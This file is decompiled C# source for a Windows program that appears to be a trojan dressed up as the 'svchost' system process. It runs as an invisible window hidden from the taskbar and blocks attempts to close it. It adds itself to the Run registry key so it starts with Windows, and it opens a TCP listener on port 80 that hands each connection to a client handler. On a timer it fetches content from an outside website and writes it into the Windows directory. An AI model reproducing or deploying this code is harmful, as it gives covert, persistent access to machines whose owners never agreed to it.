using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace svchost;

public class frmMain : Form
{
	private delegate void ListenDelegate();

	private IContainer components;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("CheckBox3")]
	private CheckBox _CheckBox3;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	private int Port;

	private bool Flag;

	private ListenDelegate ListenHandler;

	internal virtual RichTextBox RichTextBox1
	{
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RichTextBox1 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click((EventHandler)Button2_Click);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click((EventHandler)Button2_Click);
			}
		}
	}

	internal virtual CheckBox CheckBox2
	{
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_CheckBox2 != null)
			{
				_CheckBox2.remove_CheckedChanged((EventHandler)CheckBox2_CheckedChanged);
			}
			_CheckBox2 = value;
			if (_CheckBox2 != null)
			{
				_CheckBox2.add_CheckedChanged((EventHandler)CheckBox2_CheckedChanged);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick((EventHandler)Timer1_Tick_1);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick((EventHandler)Timer1_Tick_1);
			}
		}
	}

	internal virtual CheckBox CheckBox3
	{
		get
		{
			return _CheckBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_CheckBox3 != null)
			{
				_CheckBox3.remove_CheckedChanged((EventHandler)CheckBox3_CheckedChanged);
			}
			_CheckBox3 = value;
			if (_CheckBox3 != null)
			{
				_CheckBox3.add_CheckedChanged((EventHandler)CheckBox3_CheckedChanged);
			}
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_CheckBox1 != null)
			{
				_CheckBox1.remove_CheckedChanged((EventHandler)CheckBox1_CheckedChanged);
			}
			_CheckBox1 = value;
			if (_CheckBox1 != null)
			{
				_CheckBox1.add_CheckedChanged((EventHandler)CheckBox1_CheckedChanged);
			}
		}
	}

	private string start_Up(bool bCrear)
	{
		string name = Application.get_ProductName().ToString();
		string result = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
			RegistryKey registryKey2 = registryKey;
			registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			switch (bCrear)
			{
			case false:
				if (Operators.CompareString(registryKey2.GetValue(name, "")!.ToString(), "", false) != 0)
				{
					registryKey2.DeleteValue(name);
					Label1.set_Text("Ok .. clave eliminada");
				}
				else
				{
					Label1.set_Text("No se eliminó , por que el programa no iniciaba con windows");
				}
				goto default;
			default:
				registryKey2 = null;
				return result;
			case true:
				registryKey2.SetValue(name, Application.get_ExecutablePath().ToString());
				return "Ok .. clave añadida";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = ex2.Message.ToString();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public frmMain()
	{
		((Form)this).add_Closing((CancelEventHandler)frmMain_Closing);
		((Form)this).add_Load((EventHandler)frmMain_Load);
		Port = 80;
		Flag = false;
		ListenHandler = null;
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		components = new Container();
		CheckBox1 = new CheckBox();
		RichTextBox1 = new RichTextBox();
		Button2 = new Button();
		CheckBox2 = new CheckBox();
		Label1 = new Label();
		Label2 = new Label();
		Timer1 = new Timer(components);
		CheckBox3 = new CheckBox();
		((Control)this).SuspendLayout();
		CheckBox1.set_Checked(true);
		CheckBox1.set_CheckState((CheckState)1);
		CheckBox checkBox = CheckBox1;
		Point location = new Point(12, 2);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		Size size = new Size(136, 24);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(1);
		((ButtonBase)CheckBox1).set_Text("FUNCIONANDO");
		RichTextBox richTextBox = RichTextBox1;
		location = new Point(12, 32);
		((Control)richTextBox).set_Location(location);
		((Control)RichTextBox1).set_Name("RichTextBox1");
		RichTextBox richTextBox2 = RichTextBox1;
		size = new Size(125, 46);
		((Control)richTextBox2).set_Size(size);
		((Control)RichTextBox1).set_TabIndex(2);
		RichTextBox1.set_Text("\n ");
		Button button = Button2;
		location = new Point(18, 107);
		((Control)button).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button2 = Button2;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button2).set_TabIndex(5);
		((ButtonBase)Button2).set_Text("Button1");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox2.set_Checked(true);
		CheckBox2.set_CheckState((CheckState)1);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(1, 136);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(81, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(6);
		((ButtonBase)CheckBox2).set_Text("CheckBox2");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(12, 91);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(7);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(98, 91);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(8);
		Label2.set_Text("Label2");
		Timer1.set_Enabled(true);
		Timer1.set_Interval(900000);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		CheckBox3.set_Checked(true);
		CheckBox3.set_CheckState((CheckState)1);
		CheckBox checkBox5 = CheckBox3;
		location = new Point(1, 182);
		((Control)checkBox5).set_Location(location);
		((Control)CheckBox3).set_Name("CheckBox3");
		CheckBox checkBox6 = CheckBox3;
		size = new Size(81, 17);
		((Control)checkBox6).set_Size(size);
		((Control)CheckBox3).set_TabIndex(9);
		((ButtonBase)CheckBox3).set_Text("CheckBox3");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(true);
		size = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(size);
		size = new Size(1, 1);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)CheckBox3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Windows System");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void CheckBox1_CheckedChanged(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		Flag = (int)CheckBox1.get_CheckState() == 1;
		if ((int)CheckBox1.get_CheckState() == 1)
		{
			ListenHandler = Listen;
			AsyncCallback delegateCallback = ListenComplete;
			ListenHandler.BeginInvoke(delegateCallback, null);
		}
	}

	private void frmMain_Closing(object sender, CancelEventArgs e)
	{
		if (Flag)
		{
			e.Cancel = true;
			if (!e.Cancel)
			{
				CheckBox1.set_CheckState((CheckState)0);
			}
		}
	}

	private void Listen()
	{
		TcpListener tcpListener = new TcpListener(IPAddress.Any, Port);
		tcpListener.Start();
		while (Flag)
		{
			if (tcpListener.Pending())
			{
				TcpClient connection = tcpListener.AcceptTcpClient();
				clsClient clsClient2 = new clsClient(connection);
				ThreadStart start = clsClient2.ProcessThread;
				Thread thread = new Thread(start);
				thread.Start();
			}
		}
		tcpListener.Stop();
	}

	private void ListenComplete(IAsyncResult ar)
	{
		ListenHandler.EndInvoke(ar);
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
	}

	private void Label_Click(object sender, EventArgs e)
	{
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		Label1.set_Text(start_Up(bCrear: false));
	}

	private void CheckBox2_CheckedChanged(object sender, EventArgs e)
	{
		Label1.set_Text(start_Up(bCrear: true));
	}

	private void Timer1_Tick_1(object sender, EventArgs e)
	{
		((Control)CheckBox3).Refresh();
		((Control)RichTextBox1).Refresh();
		try
		{
			Process[] processesByName = Process.GetProcessesByName("explorer");
			if (processesByName.Length == 0)
			{
				Label2.set_Text("no trabajando");
				return;
			}
			string requestUriString = "http://www.mijalada.com";
			StringBuilder stringBuilder = new StringBuilder();
			WebResponse response = WebRequest.Create(requestUriString).GetResponse();
			StreamReader streamReader = new StreamReader(response.GetResponseStream());
			do
			{
				stringBuilder.Append(streamReader.ReadLine());
			}
			while (streamReader.ReadLine() != null);
			streamReader.ReadToEnd();
			RichTextBox1.set_Text(stringBuilder.ToString());
			RichTextBox1.SaveFile("C:\\Windows\\index.htm", (RichTextBoxStreamType)1);
			Label2.set_Text("corriendo");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Label2.set_Text("Error!");
			ProjectData.ClearProjectError();
		}
	}

	private void CheckBox3_CheckedChanged(object sender, EventArgs e)
	{
	}
}
